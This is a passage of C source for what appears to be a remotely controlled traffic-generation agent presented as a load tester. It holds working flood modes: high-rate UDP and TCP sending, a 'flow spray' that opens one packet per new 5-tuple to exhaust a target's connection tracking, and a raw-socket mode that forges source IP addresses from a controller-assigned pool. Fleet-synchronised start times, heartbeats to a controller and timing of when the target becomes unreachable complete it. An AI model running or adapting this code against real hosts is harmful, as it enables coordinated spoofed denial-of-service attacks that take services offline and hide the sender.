  /* results (written by mode function) */
  uint64_t total_bytes;
  uint64_t total_ops;
  uint64_t err_eagain;
  uint64_t err_connreset;
  uint64_t err_pipe;
  uint64_t err_connrefused;
  uint64_t err_enobufs;
  uint64_t err_emsgsize;
  uint64_t err_ehostunreach;
  uint64_t err_eacces;
  uint64_t err_eperm;
  uint64_t err_enetunreach;
  uint64_t err_other;
  int      first_other_errno;
  uint32_t retransmits;
  uint32_t rtt_us;
  uint32_t rttvar_us;
  uint32_t min_rtt_us;
  uint32_t max_rtt_us;
  int target_reachable;
  uint64_t first_unreachable_ns;  /* CLOCK_MONOTONIC timestamp of first send failure, 0 = never */
};

/* Block until CLOCK_MONOTONIC reaches start_mono_ns (coordinated fleet start).
 * Sleep until 2ms before the target, then busy-spin for sub-ms precision. */
static void wait_for_start(uint64_t start_mono_ns) {
  if (!start_mono_ns) return;
  for (;;) {
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    uint64_t now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
    if (now_ns >= start_mono_ns) return;
    uint64_t delta = start_mono_ns - now_ns;
    if (delta <= 2000000ULL) {
      /* Within 2ms: busy-spin for precision. */
      while (1) {
        clock_gettime(CLOCK_MONOTONIC, &now);
        now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
        if (now_ns >= start_mono_ns) return;
      }
    }
    /* Sleep for (delta - 2ms). */
    uint64_t sleep_ns = delta - 2000000ULL;
    struct timespec sl = { .tv_sec = (time_t)(sleep_ns / 1000000000ULL),
                           .tv_nsec = (long)(sleep_ns % 1000000000ULL) };
    nanosleep(&sl, NULL);
  }
}

/* Build a payload buffer according to the pattern field.
 *   0 (default) — 0xA5^i fill (seq counter + per-packet vary added in send loop)
 *   1 (zeros)   — all zeros, no seq counter; NIC-friendly baseline
 *   2 (rand)    — xorshift128+ output; pattern-resistant
 *   3 (seq)     — zeros (seq counter added in send loop)
 */
static void build_payload(char *buf, size_t len, int pattern, int thread_id) {
  switch (pattern) {
    case 1: memset(buf, 0, len); break;
    case 2: {
      uint64_t xs[2];
      int ufd = open("/dev/urandom", O_RDONLY);
      if (ufd >= 0) {
        read(ufd, xs, sizeof(xs));
        close(ufd);
      } else {
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        uint64_t seed = (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
        seed ^= (uint64_t)getpid() << 32;
        seed ^= (uint64_t)(uintptr_t)&ts;
        seed ^= (uint64_t)thread_id * 0x9E3779B97F4A7C15ULL;
        xs[0] = seed;
        xs[1] = seed ^ 0x9E3779B97F4A7C15ULL;
      }
      if ((xs[0] | xs[1]) == 0) xs[0] = 1;
      for (size_t j = 0; j + 7 < len; j += 8) {
        uint64_t s1 = xs[0], s0 = xs[1];
        xs[0] = s0;
        s1 ^= s1 << 23;
        xs[1] = s1 ^ s0 ^ (s1 >> 17) ^ (s0 >> 26);
        uint64_t v = xs[1] + s0;
        memcpy(buf + j, &v, 8);
      }
      break;
    }
    case 3: memset(buf, 0, len); break;
    default: udp_build_payload(buf, len); break;
  }
}

/* Acquire or create a per-thread rate limiter. Returns the limiter to use. */
static rate_limiter_t *setup_rate_limiter(load_thread_arg_t *a, rate_limiter_t *local_rl) {
  if (a->shared_rl) return a->shared_rl;
  if (rate_limiter_init(local_rl, a->pps, a->bps, a->pps * 0.1, a->bps * 0.1) != 0)
    return NULL;
  return local_rl;
}

/* Bind a UDP socket to src_port with SO_REUSEADDR. */
static void bind_src_port(int fd, uint16_t src_port) {
  if (!src_port) return;
  int reuse = 1;
  setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
  struct sockaddr_in ba;
  memset(&ba, 0, sizeof(ba));
  ba.sin_family = AF_INET;
  ba.sin_port = htons(src_port);
  ba.sin_addr.s_addr = INADDR_ANY;
  bind(fd, (struct sockaddr *)&ba, sizeof(ba));
}

/* ---- mode: udp_raw ---- */
/* The baseline 1400-byte filler to ip:port. Uses existing zeros/rand/seq/default
 * payload patterns. This is v0 behavior, preserved for comparison. */
static void mode_udp_raw(load_thread_arg_t *a) {
  char payload[1400];
  size_t payload_len = 1400;
  build_payload(payload, payload_len, a->pattern, a->thread_id);

  rate_limiter_t local_rl;
  rate_limiter_t *rl = setup_rate_limiter(a, &local_rl);
  if (!rl) return;

  if (a->proto_tcp) {
    int fd = tcp_sender_connect(a->target, a->port, a->src_port);
    if (fd < 0) { if (!a->shared_rl) rate_limiter_destroy(&local_rl); return; }
    wait_for_start(a->start_mono_ns);
    tcp_stats_t st = tcp_sender_run(fd, rl, payload, payload_len, a->duration);
    a->total_bytes   = st.bytes;
    a->total_ops     = st.writes;
    a->err_eagain    = st.err_eagain;
    a->err_connreset = st.err_connreset;
    a->err_pipe      = st.err_pipe;
    a->err_other     = st.err_other;
    a->retransmits   = st.retransmits;
    a->rtt_us        = st.rtt_us;
    a->rttvar_us     = st.rttvar_us;
    a->min_rtt_us    = st.min_rtt_us;
    a->max_rtt_us    = st.max_rtt_us;
    a->target_reachable = (st.err_connreset == 0 && st.err_pipe == 0);
    close(fd);
  } else {
    udp_sender_t s;
    if (udp_sender_init(&s, a->target, a->port) != 0) { if (!a->shared_rl) rate_limiter_destroy(&local_rl); return; }
    bind_src_port(s.fd, a->src_port);
    int use_seq = (a->pattern == 0 || a->pattern == 3);
    int vary = (a->pattern == 0);
    wait_for_start(a->start_mono_ns);
    udp_stats_t st = udp_sender_run(&s, rl, payload, payload_len, a->duration, use_seq, vary);
    a->total_bytes      = st.bytes;
    a->total_ops        = st.packets;
    a->err_eagain       = st.err_eagain;
    a->err_connrefused  = st.err_connrefused;
    a->err_enobufs      = st.err_enobufs;
    a->err_emsgsize     = st.err_emsgsize;
    a->err_ehostunreach = st.err_ehostunreach;
    a->err_eacces       = st.err_eacces;
    a->err_eperm        = st.err_eperm;
    a->err_enetunreach  = st.err_enetunreach;
    a->err_other        = st.err_other;
    a->first_other_errno = st.first_other_errno;
    a->target_reachable = (st.err_connrefused == 0 && st.err_ehostunreach == 0);
    a->first_unreachable_ns = st.first_err_ns;
    udp_sender_destroy(&s);
  }
  if (!a->shared_rl) rate_limiter_destroy(&local_rl);
}

/* ---- mode: udp_flow_spray ---- */
/* One small packet (24 bytes) per unique 5-tuple. Source port walked sequentially
 * through the assigned window. Measures target's conntrack / flow-table ceiling. */
static void mode_udp_flow_spray(load_thread_arg_t *a) {
  rate_limiter_t local_rl;
  rate_limiter_t *rl = setup_rate_limiter(a, &local_rl);
  if (!rl) return;

  struct sockaddr_in dst;
  memset(&dst, 0, sizeof(dst));
  dst.sin_family = AF_INET;
  dst.sin_port = htons(a->port);
  if (inet_pton(AF_INET, a->target, &dst.sin_addr) != 1) {
    if (!a->shared_rl) rate_limiter_destroy(&local_rl);
    return;
  }

  uint16_t cur_port = a->port_base ? a->port_base : (a->src_port ? a->src_port : 1024);
  uint16_t end_port = a->port_base ? (uint16_t)(a->port_base + a->port_span) : 65535;

  char pkt[24];
  memset(pkt, 0, sizeof(pkt));

  struct timespec t0, now;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  double deadline = (double)t0.tv_sec + (double)t0.tv_nsec * 1e-9 + a->duration;

  wait_for_start(a->start_mono_ns);

  int consec_err = 0;
  uint64_t ew_start = 0, ew_errs = 0, ew_ops = 0;

  for (;;) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { a->err_other++; break; }
    bind_src_port(fd, cur_port);

    rate_limiter_acquire(rl, sizeof(pkt));
    ssize_t n = sendto(fd, pkt, sizeof(pkt), 0,
                       (struct sockaddr *)&dst, sizeof(dst));
    ew_ops++;
    if (n > 0) {
      a->total_ops++;
      a->total_bytes += (uint64_t)n;
      consec_err = 0;
    } else if (n < 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) { a->err_eagain++; }
      else {
        if (errno == ECONNREFUSED) a->err_connrefused++;
        else if (errno == ENOBUFS) a->err_enobufs++;
        else if (errno == EMSGSIZE) a->err_emsgsize++;
        else if (errno == EHOSTUNREACH) a->err_ehostunreach++;
        else if (errno == EACCES) a->err_eacces++;
        else if (errno == EPERM) a->err_eperm++;
        else if (errno == ENETUNREACH) a->err_enetunreach++;
        else { if (!a->first_other_errno) a->first_other_errno = errno; a->err_other++; }
        consec_err++;
        ew_errs++;
        if (!a->first_unreachable_ns && consec_err >= 3) {
          struct timespec fu; clock_gettime(CLOCK_MONOTONIC, &fu);
          a->first_unreachable_ns = (uint64_t)fu.tv_sec * 1000000000ULL + (uint64_t)fu.tv_nsec;
        }
      }
    }
    close(fd);

    cur_port++;
    if (cur_port >= end_port) cur_port = a->port_base ? a->port_base : 1024;

    clock_gettime(CLOCK_MONOTONIC, &now);
    double t = (double)now.tv_sec + (double)now.tv_nsec * 1e-9;
    if (!a->first_unreachable_ns && ew_ops > 0) {
      uint64_t now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
      if (!ew_start) ew_start = now_ns;
      else if (now_ns - ew_start >= 1000000000ULL) {
        if (ew_errs * 100 > ew_ops)
          a->first_unreachable_ns = now_ns;
        ew_start = now_ns;
        ew_errs = 0;
        ew_ops = 0;
      }
    }
    if (t >= deadline) break;
  }
  a->target_reachable = (a->err_connrefused == 0 && a->err_ehostunreach == 0);
  if (!a->shared_rl) rate_limiter_destroy(&local_rl);
}

/* ---- mode: udp_spoof_flow ---- */
/* Raw socket (IPPROTO_RAW + IP_HDRINCL): build IP+UDP headers in userspace,
 * draw source IPs from a controller-assigned pool, source ports from the full
 * 16-bit space. Falls back to udp_flow_spray when spoof_enabled is off. */

static uint16_t ip_checksum(const void *data, int len) {
  const uint16_t *p = data;
  uint32_t sum = 0;
  while (len > 1) { sum += *p++; len -= 2; }
  if (len == 1) sum += *(const uint8_t *)p;
  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  return (uint16_t)~sum;
}

static uint16_t udp_checksum(uint32_t saddr, uint32_t daddr,
                              const uint8_t *udp_pkt, int udp_len) {
  uint32_t sum = 0;
  sum += (saddr >> 16) & 0xFFFF;
  sum += saddr & 0xFFFF;
  sum += (daddr >> 16) & 0xFFFF;
  sum += daddr & 0xFFFF;
  sum += htons(IPPROTO_UDP);
  sum += htons((uint16_t)udp_len);
  const uint16_t *p = (const uint16_t *)udp_pkt;
  int remaining = udp_len;
  while (remaining > 1) { sum += *p++; remaining -= 2; }
  if (remaining == 1) sum += *(const uint8_t *)p;
  sum = (sum >> 16) + (sum & 0xFFFF);
  sum += (sum >> 16);
  return (uint16_t)~sum;
}

static void mode_udp_spoof_flow(load_thread_arg_t *a) {
  if (!a->spoof_enabled || a->src_ip_count == 0) {
    mode_udp_flow_spray(a);
    return;
  }

  rate_limiter_t local_rl;
  rate_limiter_t *rl = setup_rate_limiter(a, &local_rl);
  if (!rl) { return; }

  int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (fd < 0) {
    fprintf(stderr, "load_test: SOCK_RAW failed (need root): %s\n", strerror(errno));
    if (!a->shared_rl) rate_limiter_destroy(&local_rl);
    mode_udp_flow_spray(a);
    return;
  }
  int one = 1;
  setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

  struct sockaddr_in dst;
  memset(&dst, 0, sizeof(dst));
  dst.sin_family = AF_INET;
  dst.sin_port = htons(a->port);
  inet_pton(AF_INET, a->target, &dst.sin_addr);

  /* IP(20) + UDP(8) + payload(24) = 52 bytes per packet */
  uint8_t pkt[52];
  memset(pkt, 0, sizeof(pkt));
  /* IP header */
  pkt[0] = 0x45;           /* version=4, ihl=5 */
  pkt[1] = 0;              /* DSCP/ECN */
  uint16_t tot_len = htons(52);
  memcpy(pkt + 2, &tot_len, 2);
  pkt[8] = 64;             /* TTL */
  pkt[9] = IPPROTO_UDP;
  memcpy(pkt + 16, &dst.sin_addr.s_addr, 4); /* dst IP */
  /* UDP header */
  uint16_t udp_dst = htons(a->port);
  memcpy(pkt + 22, &udp_dst, 2);
  uint16_t udp_len = htons(32); /* 8 hdr + 24 payload */
  memcpy(pkt + 24, &udp_len, 2);

  uint16_t src_port = 1024;
  int ip_idx = 0;
  static uint16_t pkt_id = 0;

  struct timespec t0, now;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  double deadline = (double)t0.tv_sec + (double)t0.tv_nsec * 1e-9 + a->duration;

  wait_for_start(a->start_mono_ns);

  int consec_err_s = 0;
  uint64_t ew_start_s = 0, ew_errs_s = 0, ew_ops_s = 0;

  for (;;) {
    /* rotate source IP */
    uint32_t sip = a->src_ips[ip_idx];
    ip_idx = (ip_idx + 1) % a->src_ip_count;
    memcpy(pkt + 12, &sip, 4);

    /* rotate source port */
    uint16_t sp_n = htons(src_port);
    memcpy(pkt + 20, &sp_n, 2);
    src_port++;
    if (src_port == 0) src_port = 1024;

    /* IP identification */
    uint16_t id_n = htons(pkt_id++);
    memcpy(pkt + 4, &id_n, 2);

    /* IP checksum */
    memset(pkt + 10, 0, 2);
    uint16_t cksum = ip_checksum(pkt, 20);
    memcpy(pkt + 10, &cksum, 2);

    /* UDP checksum */
    memset(pkt + 26, 0, 2);
    uint16_t uck = udp_checksum(sip, dst.sin_addr.s_addr, pkt + 20, 32);
    memcpy(pkt + 26, &uck, 2);

    rate_limiter_acquire(rl, sizeof(pkt));
    ssize_t n = sendto(fd, pkt, sizeof(pkt), 0,
                       (struct sockaddr *)&dst, sizeof(dst));
    ew_ops_s++;
    if (n > 0) {
      a->total_ops++;
      a->total_bytes += (uint64_t)n;
      consec_err_s = 0;
    } else if (n < 0) {
      if (errno == EAGAIN || errno == EWOULDBLOCK) { a->err_eagain++; }
      else {
        if (errno == ENOBUFS) a->err_enobufs++;
        else if (errno == EHOSTUNREACH) a->err_ehostunreach++;
        else if (errno == EACCES) a->err_eacces++;
        else if (errno == EPERM) a->err_eperm++;
        else if (errno == ENETUNREACH) a->err_enetunreach++;
        else { if (!a->first_other_errno) a->first_other_errno = errno; a->err_other++; }
        consec_err_s++;
        ew_errs_s++;
        if (!a->first_unreachable_ns && consec_err_s >= 3) {
          struct timespec fu; clock_gettime(CLOCK_MONOTONIC, &fu);
          a->first_unreachable_ns = (uint64_t)fu.tv_sec * 1000000000ULL + (uint64_t)fu.tv_nsec;
        }
      }
    }

    clock_gettime(CLOCK_MONOTONIC, &now);
    double t = (double)now.tv_sec + (double)now.tv_nsec * 1e-9;
    if (!a->first_unreachable_ns && ew_ops_s > 0) {
      uint64_t now_ns = (uint64_t)now.tv_sec * 1000000000ULL + (uint64_t)now.tv_nsec;
      if (!ew_start_s) ew_start_s = now_ns;
      else if (now_ns - ew_start_s >= 1000000000ULL) {
        if (ew_errs_s * 100 > ew_ops_s)
          a->first_unreachable_ns = now_ns;
        ew_start_s = now_ns;
        ew_errs_s = 0;
        ew_ops_s = 0;
      }
    }
    if (t >= deadline) break;
  }
  close(fd);
  a->target_reachable = (a->err_ehostunreach == 0 && a->err_eacces == 0);
  if (!a->shared_rl) rate_limiter_destroy(&local_rl);
}

/* ---- mode: mixed ---- */
/* Cycles through udp_raw, udp_flow_spray, and udp_spoof_flow, splitting
 * the duration equally across them. */
static void mode_mixed(load_thread_arg_t *a) {
  double phase_dur = a->duration / 3.0;
  if (phase_dur < 1.0) phase_dur = 1.0;

  load_thread_arg_t sub = *a;
  uint64_t saved_bytes, saved_ops;

  /* phase 1: udp_raw */
  sub.duration = phase_dur;
  sub.proto_tcp = 0;
  mode_udp_raw(&sub);
  saved_bytes = sub.total_bytes;
  saved_ops = sub.total_ops;

  /* phase 2: udp_flow_spray */
  sub.duration = phase_dur;
  sub.total_bytes = 0; sub.total_ops = 0;
  mode_udp_flow_spray(&sub);
  saved_bytes += sub.total_bytes;
  saved_ops += sub.total_ops;

  /* phase 3: udp_spoof_flow (falls back to flow_spray if spoof off) */
  sub.duration = phase_dur;
  sub.total_bytes = 0; sub.total_ops = 0;
  mode_udp_spoof_flow(&sub);
  saved_bytes += sub.total_bytes;
  saved_ops += sub.total_ops;

  /* aggregate results back */
  a->total_bytes     = saved_bytes;
  a->total_ops       = saved_ops;
  a->err_eagain      += sub.err_eagain;
  a->err_connrefused += sub.err_connrefused;
  a->err_other       += sub.err_other;
  a->target_reachable = sub.target_reachable;
}

/* Mode dispatch table — open for protocol builders to add entries. */
static const struct { const char *name; load_mode_fn fn; } load_modes[MODE_COUNT] = {
  [MODE_UDP_RAW]         = { "udp_raw",         mode_udp_raw },
  [MODE_UDP_FLOW_SPRAY]  = { "udp_flow_spray",  mode_udp_flow_spray },
  [MODE_UDP_SPOOF_FLOW]  = { "udp_spoof_flow",  mode_udp_spoof_flow },
  [MODE_MIXED]           = { "mixed",           mode_mixed },
};

/* Ramp helper thread: updates a rate limiter's rates linearly from 5%→100%
 * over ramp_s, in 0.5s steps, while the mode function runs in the caller. */
typedef struct {
  rate_limiter_t *rl;
  double target_pps;
  double target_bps;
  double ramp_s;
} ramp_ctx_t;

static void *ramp_thread_fn(void *arg) {
  ramp_ctx_t *ctx = (ramp_ctx_t *)arg;
  double step = 0.5;
  int steps = (int)(ctx->ramp_s / step);
  if (steps < 1) steps = 1;
  for (int s = 0; s < steps; s++) {
    struct timespec sl = { .tv_sec = 0, .tv_nsec = 500000000L };
    nanosleep(&sl, NULL);
    double frac = 0.05 + 0.95 * ((double)(s + 1) / (double)steps);
    rate_limiter_set_rates(ctx->rl, ctx->target_pps * frac, ctx->target_bps * frac);
  }
  rate_limiter_set_rates(ctx->rl, ctx->target_pps, ctx->target_bps);
  return NULL;
}

static void *load_thread_fn(void *arg) {
  load_thread_arg_t *a = (load_thread_arg_t *)arg;

  if (a->phase_count > 0 && a->phases) {
    int orig_mode = a->mode;
    double orig_dur = a->duration;
    double orig_pps = a->pps;
    double orig_bps = a->bps;

    for (int p = 0; p < a->phase_count; p++) {
      load_phase_t *ph = &a->phases[p];
      a->mode = ph->mode;

      if (ph->ramp_s > 0 && ph->ramp_s < ph->duration_s) {
        /* Ramp: create a RL at 5%, spawn a thread that linearly updates rates
         * to 100% over ramp_s, and call the mode function once for the full
         * phase duration — no gaps between steps. */
        rate_limiter_t ramp_rl;
        rate_limiter_t *orig_shared = a->shared_rl;
        rate_limiter_t *rl_to_ramp;
        int owns_ramp_rl = 0;

        if (orig_shared) {
          rl_to_ramp = orig_shared;
          if (a->thread_id == 0)
            rate_limiter_set_rates(rl_to_ramp, ph->pps * 0.05, ph->bps * 0.05);
        } else {
          double init_pps = ph->pps * 0.05;
          double init_bps = ph->bps * 0.05;
          rate_limiter_init(&ramp_rl, init_pps, init_bps,
                            init_pps * 0.1 > 1.0 ? init_pps * 0.1 : 1.0,
                            init_bps * 0.1 > 1500.0 ? init_bps * 0.1 : 1500.0);
          a->shared_rl = &ramp_rl;
          rl_to_ramp = &ramp_rl;
          owns_ramp_rl = 1;
        }

        ramp_ctx_t ramp = { .rl = rl_to_ramp, .target_pps = ph->pps,
                            .target_bps = ph->bps, .ramp_s = ph->ramp_s };
        pthread_t ramp_tid;
        int ramp_started = 0;
        if (!orig_shared || a->thread_id == 0)
          ramp_started = (pthread_create(&ramp_tid, NULL, ramp_thread_fn, &ramp) == 0);

        a->pps = ph->pps;
        a->bps = ph->bps;
        a->duration = ph->duration_s;
        if (a->mode >= 0 && a->mode < MODE_COUNT && load_modes[a->mode].fn)
          load_modes[a->mode].fn(a);

        if (ramp_started) pthread_join(ramp_tid, NULL);
        if (owns_ramp_rl) {
          rate_limiter_destroy(&ramp_rl);
          a->shared_rl = orig_shared;
        }
      } else {
        a->duration = ph->duration_s;
        a->pps = ph->pps;
        a->bps = ph->bps;
        if (a->mode >= 0 && a->mode < MODE_COUNT && load_modes[a->mode].fn)
          load_modes[a->mode].fn(a);
      }
    }

    a->mode = orig_mode;
    a->duration = orig_dur;
    a->pps = orig_pps;
    a->bps = orig_bps;
  } else {
    if (a->mode >= 0 && a->mode < MODE_COUNT && load_modes[a->mode].fn)
      load_modes[a->mode].fn(a);
  }
  return NULL;
}

#define LOAD_MAX_THREADS 16
#define SRC_PORT_WINDOWS 4096

#define MAX_SRC_IPS 64

static void node_field(char *dst, size_t cap);

typedef struct {
  load_thread_arg_t *args;
  int threads;
  int running;           /* set to 0 to stop */
  const char *cmd_id;    /* command ID for heartbeat POST */
} heartbeat_ctx_t;

static void *heartbeat_thread_fn(void *arg) {
  heartbeat_ctx_t *ctx = (heartbeat_ctx_t *)arg;
  char nodefld[96];
  node_field(nodefld, sizeof(nodefld));

  while (ctx->running) {
    struct timespec sl = { .tv_sec = 0, .tv_nsec = 500000000L }; /* 500ms */
    nanosleep(&sl, NULL);
    if (!ctx->running) break;

    uint64_t total_bytes = 0, total_ops = 0;
    uint64_t total_eagain = 0, total_connrefused = 0;
    uint64_t total_enobufs = 0, total_ehostunreach = 0;
    uint64_t total_eacces = 0, total_eperm = 0, total_enetunreach = 0, total_other = 0;
    for (int i = 0; i < ctx->threads; i++) {
      total_bytes        += ctx->args[i].total_bytes;
      total_ops          += ctx->args[i].total_ops;
      total_eagain       += ctx->args[i].err_eagain;
      total_connrefused  += ctx->args[i].err_connrefused;
      total_enobufs      += ctx->args[i].err_enobufs;
      total_ehostunreach += ctx->args[i].err_ehostunreach;
      total_eacces       += ctx->args[i].err_eacces;
      total_eperm        += ctx->args[i].err_eperm;
      total_enetunreach  += ctx->args[i].err_enetunreach;
      total_other        += ctx->args[i].err_other;
    }

    char body[1024];
    snprintf(body, sizeof(body),
      "{%s\"id\":\"%s\",\"state\":\"running\",\"threads\":%d,"
      "\"tx_bytes\":%llu,\"tx_ops\":%llu,"
      "\"err_eagain\":%llu,\"err_connrefused\":%llu,"
      "\"err_enobufs\":%llu,\"err_ehostunreach\":%llu,"
      "\"err_eacces\":%llu,\"err_eperm\":%llu,\"err_enetunreach\":%llu,\"err_other\":%llu}",
      nodefld, ctx->cmd_id, ctx->threads,
      (unsigned long long)total_bytes, (unsigned long long)total_ops,
      (unsigned long long)total_eagain, (unsigned long long)total_connrefused,
      (unsigned long long)total_enobufs, (unsigned long long)total_ehostunreach,
      (unsigned long long)total_eacces, (unsigned long long)total_eperm,
      (unsigned long long)total_enetunreach, (unsigned long long)total_other);

    char resp[256];
    https_request(HTTP_HEARTBEAT_PATH, body, resp, sizeof(resp));
  }
  return NULL;
}

/* Portable watchdog: sleeps for timeout seconds, then cancels any still-running
 * worker threads. Replaces pthread_timedjoin_np (glibc-only, absent in musl). */
static void *wdog_thread_fn(void *arg) {
  struct { pthread_t *tids; int *started; int count; double timeout; volatile int done; } *w = arg;
  struct timespec sl = { .tv_sec = (time_t)w->timeout,
                         .tv_nsec = (long)((w->timeout - (double)(time_t)w->timeout) * 1e9) };
  nanosleep(&sl, NULL);
  if (!w->done) {
    for (int i = 0; i < w->count; i++)
      if (w->started[i]) pthread_cancel(w->tids[i]);
    fprintf(stderr, "load_test: watchdog fired after %.0fs\n", w->timeout);
  }
  return NULL;
}

static int handle_load_test(const char *json_str, int json_len, char *out, size_t out_cap, const char *cmd_id) {
  jsmn_parser p;
  jsmn_init(&p);
  jsmntok_t toks[256];
  int n = jsmn_parse(&p, json_str, json_len, toks, 256);
  if (n < 0) return -1;

  char target[64] = {0}, proto[8] = "udp", pat[8] = {0}, modebuf[24] = {0};
  uint16_t port = 0, src_port_base = 0;
  uint16_t port_base = 0, port_span = 0, port_stride = 0;
  double duration = 10.0, pps = 50000.0, bps = 100e6;
  int threads = 1, aggregate = 0, spoof_source = 0;
  uint64_t start_mono_ns = 0;
  uint32_t src_ips[MAX_SRC_IPS];
  int src_ip_count = 0;
  load_phase_t phases[MAX_PHASES];
  int phase_count = 0;
  int conntrack_drop_pct = -1;

  for (int i = 0; i < n - 1; i++) {
    int vl = toks[i+1].end - toks[i+1].start;
    char vbuf[64];
    if (vl >= (int)sizeof(vbuf)) continue;
    memcpy(vbuf, json_str + toks[i+1].start, vl); vbuf[vl] = 0;

    if (tok_eq(json_str, &toks[i], "target"))        { memcpy(target, vbuf, vl + 1); }
    else if (tok_eq(json_str, &toks[i], "port"))      port = (uint16_t)atoi(vbuf);
    else if (tok_eq(json_str, &toks[i], "duration"))  duration = atof(vbuf);
    else if (tok_eq(json_str, &toks[i], "proto"))     { memcpy(proto, vbuf, vl + 1); }
    else if (tok_eq(json_str, &toks[i], "threads"))   threads = atoi(vbuf);
    else if (tok_eq(json_str, &toks[i], "pps"))       pps = atof(vbuf);
    else if (tok_eq(json_str, &toks[i], "bps"))       bps = atof(vbuf);
    else if (tok_eq(json_str, &toks[i], "aggregate")) aggregate = (vbuf[0] == 't' || vbuf[0] == '1');
    else if (tok_eq(json_str, &toks[i], "src_port"))  src_port_base = (uint16_t)atoi(vbuf);
    else if (tok_eq(json_str, &toks[i], "pattern"))   { memcpy(pat, vbuf, vl + 1); }
    else if (tok_eq(json_str, &toks[i], "mode"))      { memcpy(modebuf, vbuf, vl + 1); }
    else if (tok_eq(json_str, &toks[i], "spoof_source")) spoof_source = (vbuf[0] == 't' || vbuf[0] == '1');
    else if (tok_eq(json_str, &toks[i], "start_mono_ns")) start_mono_ns = (uint64_t)strtoull(vbuf, NULL, 10);
    else if (tok_eq(json_str, &toks[i], "port_base"))   port_base = (uint16_t)atoi(vbuf);
    else if (tok_eq(json_str, &toks[i], "port_span"))   port_span = (uint16_t)atoi(vbuf);
    else if (tok_eq(json_str, &toks[i], "port_stride")) port_stride = (uint16_t)atoi(vbuf);
    else if (tok_eq(json_str, &toks[i], "src_ips") && toks[i+1].type == JSMN_ARRAY) {
      int arr = i + 1, cnt = toks[arr].size;
      int t = arr + 1;
      for (int j = 0; j < cnt && src_ip_count < MAX_SRC_IPS; j++, t++) {
        char ipbuf[20]; int l = toks[t].end - toks[t].start;
        if (l < (int)sizeof(ipbuf)) {
          memcpy(ipbuf, json_str + toks[t].start, l); ipbuf[l] = 0;
          struct in_addr a;
          if (inet_pton(AF_INET, ipbuf, &a) == 1)
            src_ips[src_ip_count++] = a.s_addr;
        }
      }
    }
    else if (tok_eq(json_str, &toks[i], "phases") && toks[i+1].type == JSMN_ARRAY) {
      int arr = i + 1, arr_cnt = toks[arr].size;
      int t = arr + 1;
      for (int j = 0; j < arr_cnt && phase_count < MAX_PHASES; j++) {
        if (toks[t].type != JSMN_OBJECT) { t++; continue; }
        load_phase_t ph = { .mode = MODE_UDP_RAW, .duration_s = 10, .pps = 50000, .bps = 100e6, .ramp_s = 0 };
        int obj_keys = toks[t].size;
        t++;
        for (int k = 0; k < obj_keys; k++) {
          int kl = toks[t].end - toks[t].start;
          int vl2 = toks[t+1].end - toks[t+1].start;
          char kbuf[24], vb[32];
          if (kl < (int)sizeof(kbuf) && vl2 < (int)sizeof(vb)) {
            memcpy(kbuf, json_str + toks[t].start, kl); kbuf[kl] = 0;
            memcpy(vb, json_str + toks[t+1].start, vl2); vb[vl2] = 0;
            if (strcmp(kbuf, "mode") == 0) {
              for (int m = 0; m < MODE_COUNT; m++)
                if (load_modes[m].name && strcmp(vb, load_modes[m].name) == 0) { ph.mode = m; break; }
            } else if (strcmp(kbuf, "duration_s") == 0) ph.duration_s = atof(vb);
            else if (strcmp(kbuf, "pps") == 0) ph.pps = atof(vb);
            else if (strcmp(kbuf, "bps") == 0) ph.bps = atof(vb);
            else if (strcmp(kbuf, "ramp_s") == 0) ph.ramp_s = atof(vb);
          }
          t += 2;
        }
        phases[phase_count++] = ph;
      }
    }
  }

  int pattern = 0;
  if (pat[0] == 'z') pattern = 1;
  else if (pat[0] == 'r') pattern = 2;
  else if (pat[0] == 's') pattern = 3;

  int mode = MODE_UDP_RAW;
  if (modebuf[0]) {
    for (int i = 0; i < MODE_COUNT; i++) {
      if (load_modes[i].name && strcmp(modebuf, load_modes[i].name) == 0) { mode = i; break; }
    }
  }

  if (!target[0] || port == 0) {
    snprintf(out, out_cap, "load_test: missing target or port");
    return -1;
  }
  if (src_port_base > 0 && src_port_base < 1024 && geteuid() != 0) {
    snprintf(out, out_cap, "load_test: src_port=%d requires root (privileged port range 1-1023)", src_port_base);
    return -1;
  }
  if (src_port_base > 0) {
    uint32_t available = 65536 - (uint32_t)src_port_base;
    uint32_t max_threads = available / SRC_PORT_WINDOWS;
    if (max_threads < 1 || (uint32_t)threads > max_threads) {
      snprintf(out, out_cap,
               "load_test: src_port=%d with threads=%d exceeds 16-bit port range "
               "(available=%u, %d windows require <=%u threads each)",
               src_port_base, threads, available, SRC_PORT_WINDOWS, max_threads);
      return -1;
    }
  }
  if (mode == MODE_UDP_SPOOF_FLOW && spoof_source && geteuid() != 0) {
    snprintf(out, out_cap, "load_test: udp_spoof_flow with spoof_source requires root");
    return -1;
  }
  if (threads < 1) threads = 1;
  if (threads > LOAD_MAX_THREADS) threads = LOAD_MAX_THREADS;
  if (duration < 1.0) duration = 1.0;
  if (duration > 300.0) duration = 300.0;

  int proto_tcp = (proto[0] == 't' || proto[0] == 'T') ? 1 : 0;

  /* Pre-flight probe (skip for udp_raw — backward compat):
   *   Phase 1: 10 zero-byte UDP packets — reachability check.
   *   Phase 2: 100 one-packet 5-tuples (unique source ports) — estimate
   *            conntrack/flow-table drop rate. Each send is a new ephemeral
   *            socket bound to a sequential port, so each creates a distinct
   *            5-tuple on the target's conntrack. */
  if (mode != MODE_UDP_RAW) {
    int probe_ok = 0, probe_sent = 0;
    /* Phase 1: reachability */
    udp_sender_t probe;
    if (udp_sender_init(&probe, target, port) == 0) {
      char zbuf[1] = {0};
      for (int p = 0; p < 10; p++) {
        if (udp_send(&probe, zbuf, 1) >= 0) probe_ok++;
      }
      udp_sender_destroy(&probe);
    }
